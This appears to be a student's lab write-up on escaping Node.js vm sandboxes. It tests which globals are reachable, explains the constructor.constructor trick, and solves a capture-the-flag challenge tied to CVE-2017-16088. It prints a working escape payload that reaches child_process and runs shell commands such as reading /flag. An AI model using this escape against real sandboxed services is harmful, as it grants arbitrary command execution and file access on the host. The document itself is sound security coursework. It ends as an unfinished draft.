#### **Language-based Sandboxing** 

**1.1  Set up REPL**

![image-20200408163920855](/home/yanan/.config/Typora/typora-user-images/image-20200408163920855.png)

<div style="page-break-after: always; break-after: page;"></div>

**1.2** **VM context experiment**

1) Access `secret` --**Not accessible**

<img src="/home/yanan/.config/Typora/typora-user-images/image-20200411205410930.png" alt="image-20200411205410930" style="zoom:80%;" />

2) Access `Object` -- **Accessible**

![image-20200411211004579](/home/yanan/.config/Typora/typora-user-images/image-20200411211004579.png)

3) Access `global` --**Not accessible**

<img src="/home/yanan/.config/Typora/typora-user-images/image-20200411211122842.png" alt="image-20200411211122842" style="zoom:80%;" />

4) Access `process`-- **Not accessible**

![image-20200411211238111](/home/yanan/.config/Typora/typora-user-images/image-20200411211238111.png)

5) Access `require`-- **Not accessible**

![image-20200411211339420](/home/yanan/.config/Typora/typora-user-images/image-20200411211339420.png)

6) Access `this` -- **Accessible**

![image-20200411211424904](/home/yanan/.config/Typora/typora-user-images/image-20200411211424904.png)

7) Access `eval`-- **Accessible**

![image-20200411211525653](/home/yanan/.config/Typora/typora-user-images/image-20200411211525653.png)

8) Access Function -- **Accessible**

<img src="/home/yanan/.config/Typora/typora-user-images/image-20200411213518264.png" alt="image-20200411213518264" style="zoom:80%;" />

**1.3 Almost Secure**

The vm module provides a separated environment (sandbox) to run code by calling vm APIs, since the code can run in a different context.  But it does not mean we are freely to run untrusted in this context, because the code running in this separate module can still access variables, resources using in the main process. For example:



let execTest = "require('child_process').execSync('ls /');"

code = "this.constructor.constructor('return execTest')()"

**1.4 One Neat Trick**

1) Access `secret`

![image-20200409135004622](/home/yanan/.config/Typora/typora-user-images/image-20200409135004622.png)

2) Access `Object`

![image-20200409135442214](/home/yanan/.config/Typora/typora-user-images/image-20200409135442214.png)

3) Access `global`

<img src="/home/yanan/.config/Typora/typora-user-images/image-20200411213649489.png" alt="image-20200411213649489" style="zoom:80%;" />

4) Access `process`

![image-20200409142853738](/home/yanan/.config/Typora/typora-user-images/image-20200409142853738.png)

5) Access `require`

![image-20200409140450182](/home/yanan/.config/Typora/typora-user-images/image-20200409140450182.png)

6) Access `this`

![image-20200409135350714](/home/yanan/.config/Typora/typora-user-images/image-20200409135350714.png)

7) Access `eval`

![image-20200409141413118](/home/yanan/.config/Typora/typora-user-images/image-20200409141413118.png)

8) Access `Function` 

![image-20200409144045044](/home/yanan/.config/Typora/typora-user-images/image-20200409144045044.png)



**1.5 Explaining That Neat Trick**

| Code to Experiment                                           | REPL output                                                  |
| :----------------------------------------------------------- | ------------------------------------------------------------ |
| this                                                         | {} : the separated VM context                                |
| this.constructor                                             | [Function: Object]: Object Constructor                       |
| this.constructor.constructor                                 | [Function: Function]: function constructor in the main program |
| code = "Function"; vm.runInContext(code,context) === Function; | false                                                        |
| code = "this.constructor.constructor"; vm.runInContext(code, context) ===Function; | true                                                         |

Function constructor is like the highest function javascript gives, it has access to global scope, hence it can return any global things Function constructor allows you to generate a function from a string and therefore execute arbitrary code[1].

**1.6 Neat Trick to Exploitation - CVE-2017-16088**

(1) CTF user name: hit

(2) Flag:"14828{3scape_fr0m_1s0l@ti0n}\n"

![image-20200412230909874](/home/yanan/.config/Typora/typora-user-images/image-20200412230909874.png)

(3) vulnerability: unsafe `eval`.  I notice the`eval_to_json` method is using `eval()`to execute code in the given sample. So if I want to get the flag, I should inject my malicious code into `eval`mehod.

(3) Explain: As I mentioned on (3), I need to find code that can read file from `/flag`. The code should be `require('child_process').execSync('cat /flag').toString()`, but when I first tried, `require` was not allowed. In this case I probably could get process module from main process, the code came up with was: 

```js
process=this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /flag').toString();
```

2. ### Taint Analysis

   **2.1 Data flows**

3. 
4. /run/user/1000/keybase/kbfs